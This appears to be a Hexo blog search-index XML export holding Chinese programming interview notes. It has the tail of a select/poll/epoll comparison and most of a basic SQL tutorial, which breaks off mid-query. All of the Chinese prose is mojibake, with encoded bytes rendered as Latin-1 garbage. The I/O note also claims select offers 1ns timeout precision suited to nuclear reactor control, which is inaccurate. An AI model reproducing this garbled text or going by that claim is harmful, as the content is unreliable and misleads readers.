æ¯”è¾ƒ1. åŠŸèƒ½å®ƒä»¬æä¾›äº†å‡ ä¹ç›¸åŒçš„åŠŸèƒ½ï¼Œä½†æ˜¯åœ¨ä¸€äº›ç»†èŠ‚ä¸Šæœ‰æ‰€ä¸åŒï¼š select ä¼šä¿®æ”¹ fd_set å‚æ•°ï¼Œè€Œ poll ä¸ä¼šï¼› select é»˜è®¤åªèƒ½ç›‘å¬ 1024 ä¸ªæè¿°ç¬¦ï¼Œå¦‚æœè¦ç›‘å¬æ›´å¤šçš„è¯ï¼Œéœ€è¦ä¿®æ”¹ FD_SETSIZE ä¹‹åé‡æ–°ç¼–è¯‘ï¼› poll æä¾›äº†æ›´å¤šçš„äº‹ä»¶ç±»å‹ã€‚ 2. é€Ÿåº¦poll å’Œ select åœ¨é€Ÿåº¦ä¸Šéƒ½å¾ˆæ…¢ã€‚ å®ƒä»¬éƒ½é‡‡å–è½®è¯¢çš„æ–¹å¼æ¥æ‰¾åˆ° I/O å®Œæˆçš„æè¿°ç¬¦ï¼Œå¦‚æœæè¿°ç¬¦å¾ˆå¤šï¼Œé‚£ä¹ˆé€Ÿåº¦å°±ä¼šå¾ˆæ…¢ï¼› select åªä½¿ç”¨æ¯ä¸ªæè¿°ç¬¦çš„ 3 ä½ï¼Œè€Œ poll é€šå¸¸éœ€è¦ä½¿ç”¨ 64 ä½ï¼Œå› æ­¤ poll éœ€è¦åœ¨ç”¨æˆ·è¿›ç¨‹å’Œå†…æ ¸ä¹‹é—´å¤åˆ¶æ›´å¤šçš„æ•°æ®ã€‚ 3. å¯ç§»æ¤æ€§å‡ ä¹æ‰€æœ‰çš„ç³»ç»Ÿéƒ½æ”¯æŒ selectï¼Œä½†æ˜¯åªæœ‰æ¯”è¾ƒæ–°çš„ç³»ç»Ÿæ”¯æŒ pollã€‚ epoll å·¥ä½œæ¨¡å¼epoll_event æœ‰ä¸¤ç§è§¦å‘æ¨¡å¼ï¼šLTï¼ˆlevel triggerï¼‰å’Œ ETï¼ˆedge triggerï¼‰ã€‚ 1. LT æ¨¡å¼å½“ epoll_wait() æ£€æµ‹åˆ°æè¿°ç¬¦äº‹ä»¶å‘ç”Ÿå¹¶å°†æ­¤äº‹ä»¶é€šçŸ¥åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ä¸ç«‹å³å¤„ç†è¯¥äº‹ä»¶ã€‚ä¸‹æ¬¡è°ƒç”¨ epoll_wait() æ—¶ï¼Œä¼šå†æ¬¡å“åº”åº”ç”¨ç¨‹åºå¹¶é€šçŸ¥æ­¤äº‹ä»¶ã€‚æ˜¯é»˜è®¤çš„ä¸€ç§æ¨¡å¼ï¼Œå¹¶ä¸”åŒæ—¶æ”¯æŒ Blocking å’Œ No-Blockingã€‚ 2. ET æ¨¡å¼å½“ epoll_wait() æ£€æµ‹åˆ°æè¿°ç¬¦äº‹ä»¶å‘ç”Ÿå¹¶å°†æ­¤äº‹ä»¶é€šçŸ¥åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºå¿…é¡»ç«‹å³å¤„ç†è¯¥äº‹ä»¶ã€‚å¦‚æœä¸å¤„ç†ï¼Œä¸‹æ¬¡è°ƒç”¨ epoll_wait() æ—¶ï¼Œä¸ä¼šå†æ¬¡å“åº”åº”ç”¨ç¨‹åºå¹¶é€šçŸ¥æ­¤äº‹ä»¶ã€‚å¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘äº† epoll äº‹ä»¶è¢«é‡å¤è§¦å‘çš„æ¬¡æ•°ï¼Œå› æ­¤æ•ˆç‡è¦æ¯” LT æ¨¡å¼é«˜ã€‚åªæ”¯æŒ No-Blockingï¼Œä»¥é¿å…ç”±äºä¸€ä¸ªæ–‡ä»¶å¥æŸ„çš„é˜»å¡è¯»/é˜»å¡å†™æ“ä½œæŠŠå¤„ç†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦çš„ä»»åŠ¡é¥¿æ­»ã€‚ åº”ç”¨åœºæ™¯å¾ˆå®¹æ˜“äº§ç”Ÿä¸€ç§é”™è§‰è®¤ä¸ºåªè¦ç”¨ epoll å°±å¯ä»¥äº†ï¼Œselect poll éƒ½æ˜¯å†å²é—ç•™é—®é¢˜ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆåº”ç”¨åœºæ™¯ï¼Œå…¶å®å¹¶ä¸æ˜¯è¿™æ ·çš„ã€‚ 1. select åº”ç”¨åœºæ™¯select() poll() epoll_wait() éƒ½æœ‰ä¸€ä¸ª timeout å‚æ•°ï¼Œåœ¨ select() ä¸­ timeout çš„ç²¾ç¡®åº¦ä¸º 1nsï¼Œè€Œ poll() å’Œ epoll_wait() ä¸­åˆ™ä¸º 1msã€‚æ‰€ä»¥ select æ›´åŠ é€‚ç”¨äºå®æ—¶è¦æ±‚æ›´é«˜çš„åœºæ™¯ï¼Œæ¯”å¦‚æ ¸ååº”å †çš„æ§åˆ¶ã€‚ select å†å²æ›´åŠ æ‚ ä¹…ï¼Œå®ƒçš„å¯ç§»æ¤æ€§æ›´å¥½ï¼Œå‡ ä¹è¢«æ‰€æœ‰ä¸»æµå¹³å°æ‰€æ”¯æŒã€‚ 2. poll åº”ç”¨åœºæ™¯poll æ²¡æœ‰æœ€å¤§æè¿°ç¬¦æ•°é‡çš„é™åˆ¶ï¼Œå¦‚æœå¹³å°æ”¯æŒåº”è¯¥é‡‡ç”¨ poll ä¸”å¯¹å®æ—¶æ€§è¦æ±‚å¹¶ä¸æ˜¯ååˆ†ä¸¥æ ¼ï¼Œè€Œä¸æ˜¯ selectã€‚ éœ€è¦åŒæ—¶ç›‘æ§å°äº 1000 ä¸ªæè¿°ç¬¦ã€‚æ²¡æœ‰å¿…è¦ä½¿ç”¨ epollï¼Œå› ä¸ºè¿™ä¸ªåº”ç”¨åœºæ™¯ä¸‹å¹¶ä¸èƒ½ä½“ç° epoll çš„ä¼˜åŠ¿ã€‚ éœ€è¦ç›‘æ§çš„æè¿°ç¬¦çŠ¶æ€å˜åŒ–å¤šï¼Œè€Œä¸”éƒ½æ˜¯éå¸¸çŸ­æš‚çš„ã€‚å› ä¸º epoll ä¸­çš„æ‰€æœ‰æè¿°ç¬¦éƒ½å­˜å‚¨åœ¨å†…æ ¸ä¸­ï¼Œé€ æˆæ¯æ¬¡éœ€è¦å¯¹æè¿°ç¬¦çš„çŠ¶æ€æ”¹å˜éƒ½éœ€è¦é€šè¿‡ epoll_ctl() è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œé¢‘ç¹ç³»ç»Ÿè°ƒç”¨é™ä½æ•ˆç‡ã€‚å¹¶ä¸”epoll çš„æè¿°ç¬¦å­˜å‚¨åœ¨å†…æ ¸ï¼Œä¸å®¹æ˜“è°ƒè¯•ã€‚ 3. epoll åº”ç”¨åœºæ™¯ç¨‹åºåªéœ€è¦è¿è¡Œåœ¨ Linux å¹³å°ä¸Šï¼Œæœ‰éå¸¸å¤§é‡çš„æè¿°ç¬¦éœ€è¦åŒæ—¶è½®è¯¢ï¼Œè€Œä¸”è¿™äº›è¿æ¥æœ€å¥½æ˜¯é•¿è¿æ¥ã€‚ 4. æ€§èƒ½å¯¹æ¯”epoll Scalability Web Page å‚è€ƒèµ„æ–™ Stevens W R, Fenner B, Rudoff A M. UNIX network programming[M]. Addison-Wesley Professional, 2004. Boost application performance using asynchronous I/O Synchronous and Asynchronous I/O.aspx) Linux IO æ¨¡å¼åŠ selectã€pollã€epoll è¯¦è§£ poll vs select vs event-based]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FSQL%2F</url>
    <content type="text"><![CDATA[ä¸€ã€åŸºç¡€ äºŒã€åˆ›å»ºè¡¨ ä¸‰ã€ä¿®æ”¹è¡¨ å››ã€æ’å…¥ äº”ã€æ›´æ–° å…­ã€åˆ é™¤ ä¸ƒã€æŸ¥è¯¢ å…«ã€æ’åº ä¹ã€è¿‡æ»¤ åã€é€šé…ç¬¦ åä¸€ã€è®¡ç®—å­—æ®µ åäºŒã€å‡½æ•° åä¸‰ã€åˆ†ç»„ åå››ã€å­æŸ¥è¯¢ åäº”ã€è¿æ¥ åå…­ã€ç»„åˆæŸ¥è¯¢ åä¸ƒã€è§†å›¾ åå…«ã€å­˜å‚¨è¿‡ç¨‹ åä¹ã€æ¸¸æ ‡ äºŒåã€è§¦å‘å™¨ äºŒåä¸€ã€äº‹åŠ¡å¤„ç† äºŒåäºŒã€å­—ç¬¦é›† äºŒåä¸‰ã€æƒé™ç®¡ç† å‚è€ƒèµ„æ–™ ä¸€ã€åŸºç¡€æ¨¡å¼å®šä¹‰äº†æ•°æ®å¦‚ä½•å­˜å‚¨ã€å­˜å‚¨ä»€ä¹ˆæ ·çš„æ•°æ®ä»¥åŠæ•°æ®å¦‚ä½•åˆ†è§£ç­‰ä¿¡æ¯ï¼Œæ•°æ®åº“å’Œè¡¨éƒ½æœ‰æ¨¡å¼ã€‚ ä¸»é”®çš„å€¼ä¸å…è®¸ä¿®æ”¹ï¼Œä¹Ÿä¸å…è®¸å¤ç”¨ï¼ˆä¸èƒ½ä½¿ç”¨å·²ç»åˆ é™¤çš„ä¸»é”®å€¼èµ‹ç»™æ–°æ•°æ®è¡Œçš„ä¸»é”®ï¼‰ã€‚ SQLï¼ˆStructured Query Language)ï¼Œæ ‡å‡† SQL ç”± ANSI æ ‡å‡†å§”å‘˜ä¼šç®¡ç†ï¼Œä»è€Œç§°ä¸º ANSI SQLã€‚å„ä¸ª DBMS éƒ½æœ‰è‡ªå·±çš„å®ç°ï¼Œå¦‚ PL/SQLã€Transact-SQL ç­‰ã€‚ SQL è¯­å¥ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†æ˜¯æ•°æ®åº“è¡¨åã€åˆ—åå’Œå€¼æ˜¯å¦åŒºåˆ†ä¾èµ–äºå…·ä½“çš„ DBMS ä»¥åŠé…ç½®ã€‚ SQL æ”¯æŒä»¥ä¸‹ä¸‰ç§æ³¨é‡Šï¼š 12345# æ³¨é‡ŠSELECT *FROM mytable; -- æ³¨é‡Š/* æ³¨é‡Š1 æ³¨é‡Š2 */ æ•°æ®åº“åˆ›å»ºä¸ä½¿ç”¨ï¼š 12CREATE DATABASE test;USE test; äºŒã€åˆ›å»ºè¡¨123456CREATE TABLE mytable ( id INT NOT NULL AUTO_INCREMENT, col1 INT NOT NULL DEFAULT 1, col2 VARCHAR(45) NULL, col3 DATE NULL, PRIMARY KEY (`id`)); ä¸‰ã€ä¿®æ”¹è¡¨æ·»åŠ åˆ— 12ALTER TABLE mytableADD col CHAR(20); åˆ é™¤åˆ— 12ALTER TABLE mytableDROP COLUMN col; åˆ é™¤è¡¨ 1DROP TABLE mytable; å››ã€æ’å…¥æ™®é€šæ’å…¥ 12INSERT INTO mytable(col1, col2)VALUES(val1, val2); æ’å…¥æ£€ç´¢å‡ºæ¥çš„æ•°æ® 123INSERT INTO mytable1(col1, col2)SELECT col1, col2FROM mytable2; å°†ä¸€ä¸ªè¡¨çš„å†…å®¹æ’å…¥åˆ°ä¸€ä¸ªæ–°è¡¨ 12CREATE TABLE newtable ASSELECT * FROM mytable; äº”ã€æ›´æ–°123UPDATE mytableSET col = valWHERE id = 1; å…­ã€åˆ é™¤12DELETE FROM mytableWHERE id = 1; TRUNCATE TABLE å¯ä»¥æ¸…ç©ºè¡¨ï¼Œä¹Ÿå°±æ˜¯åˆ é™¤æ‰€æœ‰è¡Œã€‚ 1TRUNCATE TABLE mytable; ä½¿ç”¨æ›´æ–°å’Œåˆ é™¤æ“ä½œæ—¶ä¸€å®šè¦ç”¨ WHERE å­å¥ï¼Œä¸ç„¶ä¼šæŠŠæ•´å¼ è¡¨çš„æ•°æ®éƒ½ç ´åã€‚å¯ä»¥å…ˆç”¨ SELECT è¯­å¥è¿›è¡Œæµ‹è¯•ï¼Œé˜²æ­¢é”™è¯¯åˆ é™¤ã€‚ ä¸ƒã€æŸ¥è¯¢DISTINCTç›¸åŒå€¼åªä¼šå‡ºç°ä¸€æ¬¡ã€‚å®ƒä½œç”¨äºæ‰€æœ‰åˆ—ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰åˆ—çš„å€¼éƒ½ç›¸åŒæ‰ç®—ç›¸åŒã€‚ 12SELECT DISTINCT col1, col2FROM mytable; LIMITé™åˆ¶è¿”å›çš„è¡Œæ•°ã€‚å¯ä»¥æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºèµ·å§‹è¡Œï¼Œä» 0 å¼€å§‹ï¼›ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¿”å›çš„æ€»è¡Œæ•°ã€‚ è¿”å›å‰ 5 è¡Œï¼š 123SELECT *FROM mytableLIMIT 5; 123SELECT *FROM mytableLIMIT 0, 5; è¿”å›ç¬¬ 3 ~ 5 è¡Œï¼š 123SELECT *FROM mytableLIMIT 2, 3; å…«ã€æ’åº ASC ï¼šå‡åºï¼ˆé»˜è®¤ï¼‰ DESC ï¼šé™åº å¯ä»¥æŒ‰å¤šä¸ªåˆ—è¿›è¡Œæ’åºï¼Œå¹¶ä¸”ä¸ºæ¯ä¸ªåˆ—æŒ‡å®šä¸åŒçš„æ’åºæ–¹å¼ï¼š 123SELECT *FROM mytableORDER BY col1 DESC, col2 ASC; ä¹ã€è¿‡æ»¤ä¸è¿›è¡Œè¿‡æ»¤çš„æ•°æ®éå¸¸å¤§ï¼Œå¯¼è‡´é€šè¿‡ç½‘ç»œä¼ è¾“äº†å¤šä½™çš„æ•°æ®ï¼Œä»è€Œæµªè´¹äº†ç½‘ç»œå¸¦å®½ã€‚å› æ­¤å°½é‡ä½¿ç”¨ SQL è¯­å¥æ¥è¿‡æ»¤ä¸å¿…è¦çš„æ•°æ®ï¼Œè€Œä¸æ˜¯ä¼ è¾“æ‰€æœ‰çš„æ•°æ®åˆ°å®¢æˆ·ç«¯ä¸­ç„¶åç”±å®¢æˆ·ç«¯è¿›è¡Œè¿‡æ»¤ã€‚ 123SELECT *FROM mytableWHERE col IS NULL; ä¸‹è¡¨æ˜¾ç¤ºäº† WHERE å­å¥å¯ç”¨çš„æ“ä½œç¬¦ æ“ä½œç¬¦ è¯´æ˜ = ç­‰äº &lt; å°äº &gt; å¤§äº &lt;&gt; != ä¸ç­‰äº &lt;= !&gt; å°äºç­‰äº &gt;= !&lt; å¤§äºç­‰äº BETWEEN åœ¨ä¸¤ä¸ªå€¼ä¹‹é—´ IS NULL ä¸º NULL å€¼ åº”è¯¥æ³¨æ„åˆ°ï¼ŒNULL ä¸ 0ã€ç©ºå­—ç¬¦ä¸²éƒ½ä¸åŒã€‚ AND å’Œ OR ç”¨äºè¿æ¥å¤šä¸ªè¿‡æ»¤æ¡ä»¶ã€‚ä¼˜å…ˆå¤„ç† ANDï¼Œå½“ä¸€ä¸ªè¿‡æ»¤è¡¨è¾¾å¼æ¶‰åŠåˆ°å¤šä¸ª AND å’Œ OR æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ () æ¥å†³å®šä¼˜å…ˆçº§ï¼Œä½¿å¾—ä¼˜å…ˆçº§å…³ç³»æ›´æ¸…æ™°ã€‚ IN æ“ä½œç¬¦ç”¨äºåŒ¹é…ä¸€ç»„å€¼ï¼Œå…¶åä¹Ÿå¯ä»¥æ¥ä¸€ä¸ª SELECT å­å¥ï¼Œä»è€ŒåŒ¹é…å­æŸ¥è¯¢å¾—åˆ°çš„ä¸€ç»„å€¼ã€‚ NOT æ“ä½œç¬¦ç”¨äºå¦å®šä¸€ä¸ªæ¡ä»¶ã€‚ åã€é€šé…ç¬¦é€šé…ç¬¦ä¹Ÿæ˜¯ç”¨åœ¨è¿‡æ»¤è¯­å¥ä¸­ï¼Œä½†å®ƒåªèƒ½ç”¨äºæ–‡æœ¬å­—æ®µã€‚ % åŒ¹é… &gt;=0 ä¸ªä»»æ„å­—ç¬¦ï¼› _ åŒ¹é… ==1 ä¸ªä»»æ„å­—ç¬¦ï¼› [ ] å¯ä»¥åŒ¹é…é›†åˆå†…çš„å­—ç¬¦ï¼Œä¾‹å¦‚ [ab] å°†åŒ¹é…å­—ç¬¦ a æˆ–è€… bã€‚ç”¨è„±å­—ç¬¦ ^ å¯ä»¥å¯¹å…¶è¿›è¡Œå¦å®šï¼Œä¹Ÿå°±æ˜¯ä¸åŒ¹é…é›†åˆå†…çš„å­—ç¬¦ã€‚ ä½¿ç”¨ Like æ¥è¿›è¡Œé€šé…ç¬¦åŒ¹é…ã€‚ 123SELECT *FROM mytableWHERE col LIKE '[^AB]%'; -- ä¸ä»¥ A å’Œ B å¼€å¤´çš„ä»»æ„æ–‡æœ¬ ä¸è¦æ»¥ç”¨é€šé…ç¬¦ï¼Œé€šé…ç¬¦ä½äºå¼€å¤´å¤„åŒ¹é…ä¼šéå¸¸æ…¢ã€‚ åä¸€ã€è®¡ç®—å­—æ®µåœ¨æ•°æ®åº“æœåŠ¡å™¨ä¸Šå®Œæˆæ•°æ®çš„è½¬æ¢å’Œæ ¼å¼åŒ–çš„å·¥ä½œå¾€å¾€æ¯”å®¢æˆ·ç«¯ä¸Šå¿«å¾—å¤šï¼Œå¹¶ä¸”è½¬æ¢å’Œæ ¼å¼åŒ–åçš„æ•°æ®é‡æ›´å°‘çš„è¯å¯ä»¥å‡å°‘ç½‘ç»œé€šä¿¡é‡ã€‚ è®¡ç®—å­—æ®µé€šå¸¸éœ€è¦ä½¿ç”¨ AS æ¥å–åˆ«åï¼Œå¦åˆ™è¾“å‡ºçš„æ—¶å€™å­—æ®µåä¸ºè®¡ç®—è¡¨è¾¾å¼ã€‚ 12SELECT col1 * col2 AS aliasFROM mytable; CONCAT() ç”¨äºè¿æ¥ä¸¤ä¸ªå­—æ®µã€‚è®¸å¤šæ•°æ®åº“ä¼šä½¿ç”¨ç©ºæ ¼æŠŠä¸€ä¸ªå€¼å¡«å……ä¸ºåˆ—å®½ï¼Œå› æ­¤è¿æ¥çš„ç»“æœä¼šå‡ºç°ä¸€äº›ä¸å¿…è¦çš„ç©ºæ ¼ï¼Œä½¿ç”¨ TRIM() å¯ä»¥å»é™¤é¦–å°¾ç©ºæ ¼ã€‚ 12SELECT CONCAT(TRIM(col1), '(', TRIM(col2), ')') AS concat_colFROM mytable; åäºŒã€å‡½æ•°å„ä¸ª DBMS çš„å‡½æ•°éƒ½æ˜¯ä¸ç›¸åŒçš„ï¼Œå› æ­¤ä¸å¯ç§»æ¤ï¼Œä»¥ä¸‹ä¸»è¦æ˜¯ MySQL çš„å‡½æ•°ã€‚ æ±‡æ€» å‡½ æ•° è¯´ æ˜ AVG() è¿”å›æŸåˆ—çš„å¹³å‡å€¼ COUNT() è¿”å›æŸåˆ—çš„è¡Œæ•° MAX() è¿”å›æŸåˆ—çš„æœ€å¤§å€¼ MIN() è¿”å›æŸåˆ—çš„æœ€å°å€¼ SUM() è¿”å›æŸåˆ—å€¼ä¹‹å’Œ AVG() ä¼šå¿½ç•¥ NULL è¡Œã€‚ ä½¿ç”¨ DISTINCT å¯ä»¥è®©æ±‡æ€»å‡½æ•°å€¼æ±‡æ€»ä¸åŒçš„å€¼ã€‚ 12SELECT AVG(DISTINCT col1) AS avg_colFROM mytable; æ–‡æœ¬å¤„ç† å‡½æ•° è¯´æ˜ LEFT() å·¦è¾¹çš„å­—ç¬¦ RIGHT() å³è¾¹çš„å­—ç¬¦ LOWER() è½¬æ¢ä¸ºå°å†™å­—ç¬¦ UPPER() è½¬æ¢ä¸ºå¤§å†™å­—ç¬¦ LTRIM() å»é™¤å·¦è¾¹çš„ç©ºæ ¼ RTRIM() å»é™¤å³è¾¹çš„ç©ºæ ¼ LENGTH() é•¿åº¦ SOUNDEX() è½¬æ¢ä¸ºè¯­éŸ³å€¼ å…¶ä¸­ï¼Œ SOUNDEX() å¯ä»¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸ºæè¿°å…¶è¯­éŸ³è¡¨ç¤ºçš„å­—æ¯æ•°å­—æ¨¡å¼ã€‚ 123SELECT *FROM mytableWHERE SOUNDEX(col1) = SOUNDEX('apple') æ—¥æœŸå’Œæ—¶é—´å¤„ç† æ—¥æœŸæ ¼å¼ï¼šYYYY-MM-DD æ—¶é—´æ ¼å¼ï¼šHH:MM:SS å‡½ æ•° è¯´ æ˜ AddDate() å¢åŠ ä¸€ä¸ªæ—¥æœŸï¼ˆå¤©ã€å‘¨ç­‰ï¼‰ AddTime() å¢åŠ ä¸€ä¸ªæ—¶é—´ï¼ˆæ—¶ã€åˆ†ç­‰ï¼‰ CurDate() è¿”å›å½“å‰æ—¥æœŸ CurTime() è¿”å›å½“å‰æ—¶é—´ Date() è¿”å›æ—¥æœŸæ—¶é—´çš„æ—¥æœŸéƒ¨åˆ† DateDiff() è®¡ç®—ä¸¤ä¸ªæ—¥æœŸä¹‹å·® Date_Add() é«˜åº¦çµæ´»çš„æ—¥æœŸè¿ç®—å‡½æ•° Date_Format() è¿”å›ä¸€ä¸ªæ ¼å¼åŒ–çš„æ—¥æœŸæˆ–æ—¶é—´ä¸² Day() è¿”å›ä¸€ä¸ªæ—¥æœŸçš„å¤©æ•°éƒ¨åˆ† DayOfWeek() å¯¹äºä¸€ä¸ªæ—¥æœŸï¼Œè¿”å›å¯¹åº”çš„æ˜ŸæœŸå‡  Hour() è¿”å›ä¸€ä¸ªæ—¶é—´çš„å°æ—¶éƒ¨åˆ† Minute() è¿”å›ä¸€ä¸ªæ—¶é—´çš„åˆ†é’Ÿéƒ¨åˆ† Month() è¿”å›ä¸€ä¸ªæ—¥æœŸçš„æœˆä»½éƒ¨åˆ† Now() è¿”å›å½“å‰æ—¥æœŸå’Œæ—¶é—´ Second() è¿”å›ä¸€ä¸ªæ—¶é—´çš„ç§’éƒ¨åˆ† Time() è¿”å›ä¸€ä¸ªæ—¥æœŸæ—¶é—´çš„æ—¶é—´éƒ¨åˆ† Year() è¿”å›ä¸€ä¸ªæ—¥æœŸçš„å¹´ä»½éƒ¨åˆ† 1mysql&gt; SELECT NOW(); 12018-4-14 20:25:11 æ•°å€¼å¤„ç† å‡½æ•° è¯´æ˜ SIN() æ­£å¼¦ COS() ä½™å¼¦ TAN() æ­£åˆ‡ ABS() ç»å¯¹å€¼ SQRT() å¹³æ–¹æ ¹ MOD() ä½™æ•° EXP() æŒ‡æ•° PI() åœ†å‘¨ç‡ RAND() éšæœºæ•° åä¸‰ã€åˆ†ç»„åˆ†ç»„å°±æ˜¯æŠŠå…·æœ‰ç›¸åŒçš„æ•°æ®å€¼çš„è¡Œæ”¾åœ¨åŒä¸€ç»„ä¸­ã€‚ å¯ä»¥å¯¹åŒä¸€åˆ†ç»„æ•°æ®ä½¿ç”¨æ±‡æ€»å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œä¾‹å¦‚æ±‚åˆ†ç»„æ•°æ®çš„å¹³å‡å€¼ç­‰ã€‚ æŒ‡å®šçš„åˆ†ç»„å­—æ®µé™¤äº†èƒ½æŒ‰è¯¥å­—æ®µè¿›è¡Œåˆ†ç»„ï¼Œä¹Ÿä¼šè‡ªåŠ¨æŒ‰è¯¥å­—æ®µè¿›è¡Œæ’åºã€‚ 123SELECT col, COUNT(*) AS numFROM mytableGROUP BY col; GROUP BY è‡ªåŠ¨æŒ‰åˆ†ç»„å­—æ®µè¿›è¡Œæ’åºï¼ŒORDER BY ä¹Ÿå¯ä»¥æŒ‰æ±‡æ€»å­—æ®µæ¥è¿›è¡Œæ’åºã€‚ 1234SELECT col, COUNT(*) AS numFROM mytableGROUP BY colORDER BY num; WHERE è¿‡æ»¤è¡Œï¼ŒHAVING è¿‡æ»¤åˆ†ç»„ï¼Œè¡Œè¿‡æ»¤åº”å½“å…ˆäºåˆ†ç»„è¿‡æ»¤ã€‚ 12345SELECT col, COUNT(*) AS numFROM mytableWHERE col &gt; 2GROUP BY colHAVING num &gt;= 2; åˆ†ç»„è§„å®šï¼š GROUP BY å­å¥å‡ºç°åœ¨ WHERE å­å¥ä¹‹åï¼ŒORDER BY å­å¥ä¹‹å‰ï¼› é™¤äº†æ±‡æ€»å­—æ®µå¤–ï¼ŒSELECT è¯­å¥ä¸­çš„æ¯ä¸€å­—æ®µéƒ½å¿…é¡»åœ¨ GROUP BY å­å¥ä¸­ç»™å‡ºï¼› NULL çš„è¡Œä¼šå•ç‹¬åˆ†ä¸ºä¸€ç»„ï¼› å¤§å¤šæ•° SQL å®ç°ä¸æ”¯æŒ GROUP BY åˆ—å…·æœ‰å¯å˜é•¿åº¦çš„æ•°æ®ç±»å‹ã€‚ åå››ã€å­æŸ¥è¯¢å­æŸ¥è¯¢ä¸­åªèƒ½è¿”å›ä¸€ä¸ªå­—æ®µçš„æ•°æ®ã€‚ å¯ä»¥å°†å­æŸ¥è¯¢çš„ç»“æœä½œä¸º WHRER è¯­å¥çš„è¿‡æ»¤æ¡ä»¶ï¼š 1234SELECT *FROM mytable1WHERE col1 IN (SELECT col2 FROM mytable2); ä¸‹é¢çš„è¯­å¥å¯ä»¥æ£€ç´¢å‡ºå®¢æˆ·çš„è®¢å•æ•°é‡ï¼Œå­æŸ¥è¯¢è¯­å¥ä¼šå¯¹ç¬¬ä¸€ä¸ªæŸ¥è¯¢æ£€ç´¢å‡ºçš„æ¯ä¸ªå®¢æˆ·æ‰§è¡Œä¸€æ¬¡ï¼š 123456SELECT cust_name, (SELECT COUNT(*) FROM Orders WHERE Orders.cust_id = Customers.cust_id) AS orders_numFROM CustomersORDER BY cust_name; åäº”ã€è¿æ¥è¿æ¥ç”¨äºè¿æ¥å¤šä¸ªè¡¨ï¼Œä½¿ç”¨ JOIN å…³é”®å­—ï¼Œå¹¶ä¸”æ¡ä»¶è¯­å¥ä½¿ç”¨ ON è€Œä¸æ˜¯ WHEREã€‚ è¿æ¥å¯ä»¥æ›¿æ¢å­æŸ¥è¯¢ï¼Œå¹¶ä¸”æ¯”å­æŸ¥è¯¢çš„æ•ˆç‡ä¸€èˆ¬ä¼šæ›´å¿«ã€‚ å¯ä»¥ç”¨ AS ç»™åˆ—åã€è®¡ç®—å­—æ®µå’Œè¡¨åå–åˆ«åï¼Œç»™è¡¨åå–åˆ«åæ˜¯ä¸ºäº†ç®€åŒ– SQL è¯­å¥ä»¥åŠè¿æ¥ç›¸åŒè¡¨ã€‚ å†…è¿æ¥å†…è¿æ¥åˆç§°ç­‰å€¼è¿æ¥ï¼Œä½¿ç”¨ INNER JOIN å…³é”®å­—ã€‚ 123SELECT A.value, B.valueFROM tablea AS A INNER JOIN tableb AS BON A.key = B.key; å¯ä»¥ä¸æ˜ç¡®ä½¿ç”¨ INNER JOINï¼Œè€Œä½¿ç”¨æ™®é€šæŸ¥è¯¢å¹¶åœ¨ WHERE ä¸­å°†ä¸¤ä¸ªè¡¨ä¸­è¦è¿æ¥çš„åˆ—ç”¨ç­‰å€¼æ–¹æ³•è¿æ¥èµ·æ¥ã€‚ 123SELECT A.value, B.valueFROM tablea AS A, tableb AS BWHERE A.key = B.key; åœ¨æ²¡æœ‰æ¡ä»¶è¯­å¥çš„æƒ…å†µä¸‹è¿”å›ç¬›å¡å°”ç§¯ã€‚ è‡ªè¿æ¥è‡ªè¿æ¥å¯ä»¥çœ‹æˆå†…è¿æ¥çš„ä¸€ç§ï¼Œåªæ˜¯è¿æ¥çš„è¡¨æ˜¯è‡ªèº«è€Œå·²ã€‚ ä¸€å¼ å‘˜å·¥è¡¨ï¼ŒåŒ…å«å‘˜å·¥å§“åå’Œå‘˜å·¥æ‰€å±éƒ¨é—¨ï¼Œè¦æ‰¾å‡ºä¸ Jim å¤„åœ¨åŒä¸€éƒ¨é—¨çš„æ‰€æœ‰å‘˜å·¥å§“åã€‚ å­æŸ¥è¯¢ç‰ˆæœ¬ 123456SELECT nameFROM employeeWHERE department = ( SELECT department FROM employee WHERE name = "Jim"); è‡ªè¿æ¥ç‰ˆæœ¬ 1234SELECT e1.nameFROM employee AS e1 INNER JOIN employee AS e2ON e1.department = e2.department AND e2.name = "Jim"; è‡ªç„¶è¿æ¥è‡ªç„¶è¿æ¥æ˜¯æŠŠåŒååˆ—é€šè¿‡ç­‰å€¼æµ‹è¯•è¿æ¥èµ·æ¥çš„ï¼ŒåŒååˆ—å¯ä»¥æœ‰å¤šä¸ªã€‚ å†…è¿æ¥å’Œè‡ªç„¶è¿æ¥çš„åŒºåˆ«ï¼šå†…è¿æ¥æä¾›è¿æ¥çš„åˆ—ï¼Œè€Œè‡ªç„¶è¿æ¥è‡ªåŠ¨è¿æ¥æ‰€æœ‰åŒååˆ—ã€‚ 12SELECT A.value, B.valueFROM tablea AS A NATURAL JOIN tableb AS B; å¤–è¿æ¥å¤–è¿æ¥ä¿ç•™äº†æ²¡æœ‰å…³è”çš„é‚£äº›è¡Œã€‚åˆ†ä¸ºå·¦å¤–è¿æ¥ï¼Œå³å¤–è¿æ¥ä»¥åŠå…¨å¤–è¿æ¥ï¼Œå·¦å¤–è¿æ¥å°±æ˜¯ä¿ç•™å·¦è¡¨æ²¡æœ‰å…³è”çš„è¡Œã€‚ æ£€ç´¢æ‰€æœ‰é¡¾å®¢çš„è®¢å•ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿˜æ²¡æœ‰è®¢å•ä¿¡æ¯çš„é¡¾å®¢ã€‚ 123SELECT Customers.cust_id, Orders.order_numFROM Customers LEFT OUTER JOIN OrdersON Customers.cust_id = 